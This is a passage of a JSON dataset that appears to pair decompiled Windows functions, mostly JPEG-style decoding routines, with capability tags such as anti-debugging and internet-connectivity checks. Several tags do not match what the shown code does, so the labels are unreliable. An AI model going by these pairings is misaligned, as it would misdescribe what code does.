        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0047e0d8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t in_EAX;\n    uint32_t uVar10;\n    int32_t *in_ECX;\n    uint32_t uVar11;\n    uint16_t *puVar12;\n    uint8_t **in_EDX;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t *var_70h;\n    uint8_t **var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint8_t *var_34h;\n    int16_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1cc);\n    iVar2 = *(iVar1 + 0x18);\n    iVar3 = *(in_EAX + 0x70);\n    iVar4 = *(in_EAX + 0x144);\n    iVar5 = *(iVar1 + 0x28);\n    iVar6 = **(in_EAX + 0x88);\n    iVar7 = *(*(in_EAX + 0x88) + 4);\n    iVar8 = *(*(in_EAX + 0x88) + 8);\n    var_48h = 0;\n    var_70h = in_ECX;\n    var_6ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            var_34h = *var_6ch;\n            var_38h = *var_70h;\n            if (*(iVar1 + 0x24) == 0) {\n                var_40h = 1;\n                var_44h = 3;\n                var_30h = *(iVar1 + 0x20);\n                *(iVar1 + 0x24) = 1;\n            }\n            else {\n                var_34h = var_34h + (iVar3 + -1) * 3;\n                var_38h = var_38h + iVar3 + -1;\n                var_40h = -1;\n                var_44h = -3;\n                var_30h = *(iVar1 + 0x20) + (iVar3 * 3 + 3) * 2;\n                *(iVar1 + 0x24) = 0;\n            }\n            var_20h = 0;\n            var_1ch = 0;\n            var_18h = 0;\n            var_2ch = 0;\n            var_28h = 0;\n            var_24h = 0;\n            iVar14 = 0;\n            iVar16 = 0;\n            iVar18 = 0;\n            iVar9 = iVar3;\n            while( true ) {\n                if (iVar9 == 0) break;\n                uVar10 = *(iVar4 + *(iVar5 + (iVar18 + var_30h[var_44h] + 8 >> 4) * 4) + *var_34h);\n                uVar11 = *(iVar4 + *(iVar5 + (iVar16 + var_30h[var_44h + 1] + 8 >> 4) * 4) + var_34h[1]);\n                uVar13 = *(iVar4 + *(iVar5 + (iVar14 + var_30h[var_44h + 2] + 8 >> 4) * 4) + var_34h[2]);\n                iVar18 = uVar13 >> 3;\n                puVar12 = *(iVar2 + (uVar10 >> 3) * 4) + (uVar11 >> 2) * 0x40 + iVar18 * 2;\n                if (*puVar12 == 0) {\n                    fcn.0047df2c(iVar18);\n                }\n                iVar18 = *puVar12 - 1;\n                *var_38h = iVar18;\n                iVar19 = uVar10 - *(iVar6 + iVar18);\n                iVar17 = uVar11 - *(iVar7 + iVar18);\n                iVar15 = uVar13 - *(iVar8 + iVar18);\n                *var_30h = var_24h + iVar19 * 3;\n                var_24h = var_18h + iVar19 * 5;\n                iVar18 = iVar19 * 7;\n                var_30h[1] = var_28h + iVar17 * 3;\n                var_28h = var_1ch + iVar17 * 5;\n                iVar16 = iVar17 * 7;\n                var_30h[2] = var_2ch + iVar15 * 3;\n                var_2ch = var_20h + iVar15 * 5;\n                iVar14 = iVar15 * 7;\n                var_34h = var_34h + var_44h;\n                var_38h = var_38h + var_40h;\n                var_30h = var_30h + var_44h;\n                iVar9 = iVar9 + -1;\n                var_20h = iVar15;\n                var_1ch = iVar17;\n                var_18h = iVar19;\n            }\n            *var_30h = var_24h;\n            var_30h[1] = var_28h;\n            var_30h[2] = var_2ch;\n            var_48h = var_48h + 1;\n            var_70h = var_70h + 1;\n            var_6ch = var_6ch + 1;\n        } while (var_48h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1495
    },
    "0047e5b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0047e5b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x73] = puVar2;\n    *puVar2 = 0x47e498;\n    puVar2[3] = 0x47e5a4;\n    puVar2[8] = 0;\n    puVar2[10] = 0;\n    if (in_EAX[0x1e] != 3) {\n        *(*in_EAX + 0x14) = 0x2f;\n        (***in_EAX)();\n    }\n    uVar3 = (**in_EAX[1])();\n    puVar2[6] = uVar3;\n    iVar4 = 0;\n    do {\n        uVar3 = (**(in_EAX[1] + 4))();\n        *(puVar2[6] + iVar4 * 4) = uVar3;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x20);\n    puVar2[7] = 1;\n    if (in_EAX[0x1b] == 0) {\n        puVar2[4] = 0;\n    }\n    else {\n        iVar4 = in_EAX[0x18];\n        if (iVar4 < 8) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x38;\n            *(iVar1 + 0x18) = 8;\n            (***in_EAX)();\n        }\n        if (0x100 < iVar4) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x39;\n            *(iVar1 + 0x18) = 0x100;\n            (***in_EAX)();\n        }\n        uVar3 = (**(in_EAX[1] + 8))(3);\n        puVar2[4] = uVar3;\n        puVar2[5] = iVar4;\n    }\n    if (in_EAX[0x16] != 0) {\n        in_EAX[0x16] = 2;\n    }\n    if (in_EAX[0x16] == 2) {\n        uVar3 = (**(in_EAX[1] + 4))();\n        puVar2[8] = uVar3;\n        fcn.0047e3dc();\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "0047e9e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0047e9e0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    iStack24 = 0;\n    iStack20 = *(in_EAX + 0xd8);\n    for (; iStack24 < *(in_EAX + 0x24); iStack24 = iStack24 + 1) {\n        uVar6 = *(iStack20 + 0xc) * *(iStack20 + 0x24);\n        iVar3 = uVar6 / *(in_EAX + 0x13c);\n        uVar5 = *(iStack20 + 0x2c) % uVar6;\n        if (uVar5 == 0) {\n            uVar5 = uVar6;\n        }\n        if (iStack24 == 0) {\n            *(iVar1 + 0x48) = (uVar5 - 1) / iVar3 + 1;\n        }\n        iVar2 = *(*(iVar1 + 0x38 + *(iVar1 + 0x40) * 4) + iStack24 * 4);\n        for (iVar4 = 0; SBORROW4(iVar4, iVar3 * 2) != iVar4 + iVar3 * -2 < 0; iVar4 = iVar4 + 1) {\n            *(iVar2 + (iVar4 + uVar5) * 4) = *(iVar2 + -4 + uVar5 * 4);\n        }\n        iStack20 = iStack20 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "0047eb0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047eb0c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar3 = (**(*(in_EAX + 0x1ac) + 0xc))();\n        if (iVar3 == 0) {\n            return;\n        }\n        *(iVar1 + 0x30) = 1;\n    }\n    uVar2 = *(in_EAX + 0x13c);\n    (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX);\n    if (uVar2 <= *(iVar1 + 0x34)) {\n        *(iVar1 + 0x30) = 0;\n        *(iVar1 + 0x34) = 0;\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "0047eb84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047eb84(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t *in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1a8);\n    if (*(iVar1 + 0x30) == 0) {\n        iVar2 = (**(*(in_EAX + 0x1ac) + 0xc))();\n        if (iVar2 == 0) {\n            return;\n        }\n        *(iVar1 + 0x30) = 1;\n        *(iVar1 + 0x4c) = *(iVar1 + 0x4c) + 1;\n    }\n    iVar2 = *(iVar1 + 0x44);\n    if (iVar2 != 0) {\n        if (iVar2 == 1) goto code_r0x0047ec42;\n        if (iVar2 != 2) {\n            return;\n        }\n        (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX, in_EDX, *(iVar1 + 0x48));\n        if (*(iVar1 + 0x34) < *(iVar1 + 0x48)) {\n            return;\n        }\n        *(iVar1 + 0x44) = 0;\n        if (arg_8h <= *in_ECX) {\n            return;\n        }\n    }\n    *(iVar1 + 0x34) = 0;\n    *(iVar1 + 0x48) = *(in_EAX + 0x13c) + -1;\n    if (*(iVar1 + 0x4c) == *(in_EAX + 0x140)) {\n        fcn.0047e9e0();\n    }\n    *(iVar1 + 0x44) = 1;\ncode_r0x0047ec42:\n    (**(*(in_EAX + 0x1b0) + 4))(arg_8h, in_ECX, in_EDX, *(iVar1 + 0x48));\n    if (*(iVar1 + 0x48) <= *(iVar1 + 0x34)) {\n        if (*(iVar1 + 0x4c) == 1) {\n            fcn.0047e8e4();\n        }\n        *(iVar1 + 0x40) = *(iVar1 + 0x40) ^ 1;\n        *(iVar1 + 0x30) = 0;\n        *(iVar1 + 0x34) = *(in_EAX + 0x13c) + 1;\n        *(iVar1 + 0x48) = *(in_EAX + 0x13c) + 2;\n        *(iVar1 + 0x44) = 2;\n    }\n    return;\n}\n",
        "token_count": 644
    },
    "0047eccc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047eccc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iStack28;\n    int32_t iStack20;\n    \n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x6a] = puVar1;\n    *puVar1 = 0x47eaa4;\n    if (param_2 != 0) {\n        *(*in_EAX + 0x14) = 4;\n        (***in_EAX)();\n    }\n    if (*(in_EAX[0x71] + 8) == 0) {\n        iStack20 = in_EAX[0x4f];\n    }\n    else {\n        if (in_EAX[0x4f] < 2) {\n            *(*in_EAX + 0x14) = 0x2f;\n            (***in_EAX)();\n        }\n        fcn.0047e6d4();\n        iStack20 = in_EAX[0x4f] + 2;\n    }\n    iStack28 = 0;\n    iVar3 = in_EAX[0x36];\n    puVar1 = puVar1 + 2;\n    for (; iStack28 < in_EAX[9]; iStack28 = iStack28 + 1) {\n        uVar2 = (**(in_EAX[1] + 8))(((*(iVar3 + 0xc) * *(iVar3 + 0x24)) / in_EAX[0x4f]) * iStack20);\n        *puVar1 = uVar2;\n        puVar1 = puVar1 + 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "0047fd28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047fd28(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puStack20;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1ac) = puVar1;\n    *puVar1 = 0x47edf8;\n    puVar1[2] = 0x47ee08;\n    puVar1[0x1c] = 0;\n    if (param_2 == 0) {\n        iVar6 = (**(*(in_EAX + 4) + 4))();\n        piVar4 = puVar1 + 8;\n        iVar5 = 0;\n        do {\n            iVar3 = iVar5 + 1;\n            *piVar4 = iVar5 * 0x80 + iVar6;\n            piVar4 = piVar4 + 1;\n            iVar5 = iVar3;\n        } while (iVar3 < 10);\n        puVar1[1] = 0x47f084;\n        puVar1[3] = 0x47ee44;\n        puVar1[4] = 0;\n    }\n    else {\n        iVar5 = *(in_EAX + 0xd8);\n        puStack20 = puVar1 + 0x12;\n        for (iVar6 = 0; iVar6 < *(in_EAX + 0x24); iVar6 = iVar6 + 1) {\n            iVar3 = *(iVar5 + 0xc);\n            if (*(in_EAX + 0xdc) != 0) {\n                iVar3 = iVar3 * 3;\n            }\n            uVar2 = fcn.004837bc(iVar6, iVar3);\n            uVar2 = fcn.004837bc(uVar2);\n            uVar2 = (**(*(in_EAX + 4) + 0x14))(iVar3, uVar2);\n            *puStack20 = uVar2;\n            puStack20 = puStack20 + 1;\n            iVar5 = iVar5 + 0x54;\n        }\n        puVar1[1] = 0x47f088;\n        puVar1[3] = 0x47f278;\n        puVar1[4] = puVar1 + 0x12;\n    }\n    return;\n}\n",
        "token_count": 560
    },
    "0047ff60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047ff60(uint noname_0, int32_t *arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1b0);\n    if (*(iVar1 + 0x18) == 0) {\n        uVar3 = (**(*(in_EAX + 4) + 0x1c))(1, *(iVar1 + 0x10));\n        *(iVar1 + 0xc) = uVar3;\n    }\n    uVar2 = *(iVar1 + 0x18);\n    (**(*(in_EAX + 0x1c4) + 4))(*(iVar1 + 0x10), iVar1 + 0x18, *(iVar1 + 0xc), arg_14h);\n    if (uVar2 < *(iVar1 + 0x18)) {\n        iVar4 = *(iVar1 + 0x18) - uVar2;\n        (**(*(in_EAX + 0x1cc) + 4))(iVar4);\n        *arg_ch = *arg_ch + iVar4;\n    }\n    uVar2 = *(iVar1 + 0x10);\n    if (uVar2 < *(iVar1 + 0x18) || uVar2 == *(iVar1 + 0x18)) {\n        *(iVar1 + 0x14) = *(iVar1 + 0x14) + uVar2;\n        *(iVar1 + 0x18) = 0;\n    }\n    return;\n}\n",
        "token_count": 401
    },
    "00480004": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480004(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x1b0);\n    if (*(iVar1 + 0x18) == 0) {\n        uVar2 = (**(*(in_EAX + 4) + 0x1c))(0, *(iVar1 + 0x10));\n        *(iVar1 + 0xc) = uVar2;\n    }\n    uVar4 = *(iVar1 + 0x10) - *(iVar1 + 0x18);\n    if (arg_8h - *arg_ch < uVar4) {\n        uVar4 = arg_8h - *arg_ch;\n    }\n    uVar3 = *(in_EAX + 0x74) - *(iVar1 + 0x14);\n    if (uVar3 < uVar4) {\n        uVar4 = uVar3;\n    }\n    (**(*(in_EAX + 0x1cc) + 4))(uVar4);\n    *arg_ch = *arg_ch + uVar4;\n    *(iVar1 + 0x18) = *(iVar1 + 0x18) + uVar4;\n    uVar4 = *(iVar1 + 0x10);\n    if (uVar4 < *(iVar1 + 0x18) || uVar4 == *(iVar1 + 0x18)) {\n        *(iVar1 + 0x14) = *(iVar1 + 0x14) + uVar4;\n        *(iVar1 + 0x18) = 0;\n    }\n    return;\n}\n",
        "token_count": 411
    },
    "0048009c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048009c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b0) = puVar1;\n    *puVar1 = 0x47fe3c;\n    puVar1[2] = 0;\n    puVar1[3] = 0;\n    if (*(in_EAX + 0x54) != 0) {\n        puVar1[4] = *(in_EAX + 0x138);\n        if (param_2 == 0) {\n            uVar2 = (**(*(in_EAX + 4) + 8))(puVar1[4]);\n            puVar1[3] = uVar2;\n        }\n        else {\n            uVar2 = fcn.004837bc(*(in_EAX + 0x70) * *(in_EAX + 0x78));\n            uVar2 = (**(*(in_EAX + 4) + 0x10))(puVar1[4], uVar2);\n            puVar1[2] = uVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00480534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480534(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint *in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *arg_8h;\n    uVar6 = *(*(in_EAX + 0x1c4) + 0x8c + *(in_EDX + 4));\n    uVar3 = *(*(in_EAX + 0x1c4) + 0x96 + *(in_EDX + 4));\n    var_18h = in_ECX;\n    for (var_14h = 0; var_14h < *(in_EAX + 0x138); var_14h = var_14h + uVar3) {\n        puVar7 = *var_18h;\n        puVar4 = *(iVar2 + var_14h * 4);\n        puVar8 = puVar4 + *(in_EAX + 0x70);\n        while (puVar4 < puVar8) {\n            uVar1 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar5 = uVar6;\n            if (uVar6 != 0) {\n                do {\n                    *puVar4 = uVar1;\n                    puVar4 = puVar4 + 1;\n                    uVar5 = uVar5 - 1;\n                } while (0 < uVar5);\n            }\n        }\n        if (1 < uVar3) {\n            fcn.004837d4(*(in_EAX + 0x70), uVar3 - 1, var_14h + 1);\n        }\n        var_18h = var_18h + 1;\n    }\n    return;\n}\n",
        "token_count": 488
    },
    "00480790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480790(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    uint8_t **in_ECX;\n    int32_t in_EDX;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint8_t **var_2ch;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *arg_8h;\n    var_1ch = 0;\n    var_2ch = in_ECX;\n    while (var_1ch < *(in_EAX + 0x138)) {\n        var_20h = 0;\n        var_28h = iVar2 + var_1ch * 4;\n        do {\n            puVar3 = *var_2ch;\n            if (var_20h == 0) {\n                var_10h = var_2ch[-1];\n            }\n            else {\n                var_10h = var_2ch[1];\n            }\n            puVar4 = *var_28h;\n            var_1ch = var_1ch + 1;\n            var_28h = var_28h + 1;\n            iVar7 = *puVar3 * 3 + *var_10h;\n            iVar8 = puVar3[1] * 3 + var_10h[1];\n            var_10h = var_10h + 2;\n            puVar3 = puVar3 + 2;\n            *puVar4 = iVar7 * 4 + 8 >> 4;\n            puVar4[1] = iVar7 * 3 + iVar8 + 7 >> 4;\n            for (iVar6 = *(in_EDX + 0x28) + -2; puVar5 = puVar4 + 2,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                uVar1 = *var_10h;\n                var_10h = var_10h + 1;\n                iVar9 = *puVar3 * 3 + uVar1;\n                puVar3 = puVar3 + 1;\n                *puVar5 = iVar8 * 3 + iVar7 + 8 >> 4;\n                puVar4[3] = iVar8 * 3 + iVar9 + 7 >> 4;\n                iVar7 = iVar8;\n                iVar8 = iVar9;\n                puVar4 = puVar5;\n            }\n            *puVar5 = iVar8 * 3 + iVar7 + 8 >> 4;\n            puVar4[3] = iVar8 * 4 + 7 >> 4;\n            var_20h = var_20h + 1;\n        } while (var_20h < 2);\n        var_2ch = var_2ch + 1;\n    }\n    return;\n}\n",
        "token_count": 735
    },
    "004808e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004808e4(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t *in_EAX;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t iStack40;\n    uint *puStack20;\n    \n    puVar4 = (**in_EAX[1])();\n    in_EAX[0x71] = puVar4;\n    *puVar4 = 0x480400;\n    puVar4[1] = fcn.00480418;\n    puVar4[2] = 0;\n    if (in_EAX[0x4b] != 0) {\n        *(*in_EAX + 0x14) = 0x19;\n        (***in_EAX)();\n    }\n    if ((in_EAX[0x13] == 0) || (in_EAX[0x4f] < 2)) {\n        bVar2 = false;\n    }\n    else {\n        bVar2 = true;\n    }\n    iStack40 = 0;\n    iVar9 = in_EAX[0x36];\n    puStack20 = puVar4 + 0x23;\n    piVar8 = puVar4 + 0x19;\n    for (; iStack40 < in_EAX[9]; iStack40 = iStack40 + 1) {\n        iVar5 = (*(iVar9 + 8) * *(iVar9 + 0x24)) / in_EAX[0x4f];\n        iVar6 = (*(iVar9 + 0xc) * *(iVar9 + 0x24)) / in_EAX[0x4f];\n        iVar7 = in_EAX[0x4d];\n        iVar1 = in_EAX[0x4e];\n        *piVar8 = iVar6;\n        bVar3 = true;\n        if (*(iVar9 + 0x30) == 0) {\n            piVar8[-0xc] = fcn.00480524;\n            bVar3 = false;\n        }\n        else if ((iVar5 == iVar7) && (iVar6 == iVar1)) {\n            piVar8[-0xc] = fcn.00480518;\n            bVar3 = false;\n        }\n        else if ((iVar5 * 2 == iVar7) && (iVar6 == iVar1)) {\n            if ((bVar2) && (2 < *(iVar9 + 0x28))) {\n                piVar8[-0xc] = fcn.004806dc;\n            }\n            else {\n                piVar8[-0xc] = fcn.004805f0;\n            }\n        }\n        else if ((iVar5 * 2 == iVar7) && (iVar6 * 2 == iVar1)) {\n            if ((bVar2) && (2 < *(iVar9 + 0x28))) {\n                piVar8[-0xc] = fcn.00480790;\n                puVar4[2] = 1;\n            }\n            else {\n                piVar8[-0xc] = fcn.0048064c;\n            }\n        }\n        else if ((iVar7 % iVar5 == 0) && (iVar1 % iVar6 == 0)) {\n            piVar8[-0xc] = fcn.00480534;\n            *puStack20 = iVar7 / iVar5;\n            *(puStack20 + 10) = iVar1 / iVar6;\n        }\n        else {\n            *(*in_EAX + 0x14) = 0x26;\n            (***in_EAX)();\n        }\n        if (bVar3) {\n            fcn.004837bc(in_EAX[0x4e]);\n            iVar7 = (**(in_EAX[1] + 8))();\n            piVar8[-0x16] = iVar7;\n        }\n        piVar8 = piVar8 + 1;\n        puStack20 = puStack20 + 1;\n        iVar9 = iVar9 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 905
    },
    "00480afc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480afc(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    float fVar1;\n    float fVar2;\n    float fVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int16_t *in_ECX;\n    int32_t in_EDX;\n    float *pfVar5;\n    float *pfVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_150h;\n    float afStack336 [15];\n    float afStack276 [8];\n    float afStack244 [8];\n    float afStack212 [8];\n    float afStack180 [8];\n    float afStack148 [8];\n    float afStack116 [8];\n    int32_t *var_50h;\n    float var_4ch;\n    int32_t var_48h;\n    float var_44h;\n    float var_40h;\n    float fStack64;\n    float fStack60;\n    float var_34h;\n    float var_30h;\n    float var_2ch;\n    float fStack44;\n    float fStack40;\n    float var_20h;\n    float var_1ch;\n    float var_18h;\n    float var_14h;\n    float var_10h;\n    float var_ch;\n    float fStack12;\n    float fStack8;\n    \n    iVar8 = 8;\n    pfVar6 = &var_150h;\n    var_48h = *(in_EAX + 0x144) + 0x80;\n    pfVar5 = *(in_EDX + 0x50);\n    do {\n        if ((((in_ECX[8] == 0) && (in_ECX[0x10] == 0)) && (in_ECX[0x18] == 0)) &&\n           (((in_ECX[0x20] == 0 && (in_ECX[0x28] == 0)) && ((in_ECX[0x30] == 0 && (in_ECX[0x38] == 0)))))) {\n            var_4ch = *in_ECX * *pfVar5;\n            *pfVar6 = *in_ECX * *pfVar5;\n            pfVar6[8] = var_4ch;\n            pfVar6[0x10] = var_4ch;\n            pfVar6[0x18] = var_4ch;\n            pfVar6[0x20] = var_4ch;\n            pfVar6[0x28] = var_4ch;\n            pfVar6[0x30] = var_4ch;\n            pfVar6[0x38] = var_4ch;\n        }\n        else {\n            fVar1 = *in_ECX * *pfVar5 + in_ECX[0x20] * pfVar5[0x20];\n            fVar2 = *in_ECX * *pfVar5 - in_ECX[0x20] * pfVar5[0x20];\n            var_30h = in_ECX[0x10] * pfVar5[0x10] + in_ECX[0x30] * pfVar5[0x30];\n            fVar3 = (in_ECX[0x10] * pfVar5[0x10] - in_ECX[0x30] * pfVar5[0x30]) * *0x480f30 - var_30h;\n            fStack8 = fVar1 + var_30h;\n            var_10h = fVar1 - var_30h;\n            fStack12 = fVar2 + fVar3;\n            var_ch = fVar2 - fVar3;\n            var_44h = in_ECX[0x28] * pfVar5[0x28] + in_ECX[0x18] * pfVar5[0x18];\n            fStack60 = in_ECX[0x28] * pfVar5[0x28] - in_ECX[0x18] * pfVar5[0x18];\n            fStack64 = in_ECX[8] * pfVar5[8] + in_ECX[0x38] * pfVar5[0x38];\n            var_40h = in_ECX[8] * pfVar5[8] - in_ECX[0x38] * pfVar5[0x38];\n            var_20h = fStack64 + var_44h;\n            fStack44 = (fStack64 - var_44h) * *0x480f30;\n            var_34h = (fStack60 + var_40h) * *0x480f34;\n            fStack40 = *0x480f38 * var_40h - var_34h;\n            var_2ch = *0x480f3c * fStack60 + var_34h;\n            var_1ch = var_2ch - var_20h;\n            var_18h = fStack44 - var_1ch;\n            var_14h = fStack40 + var_18h;\n            *pfVar6 = fStack8 + var_20h;\n            pfVar6[0x38] = 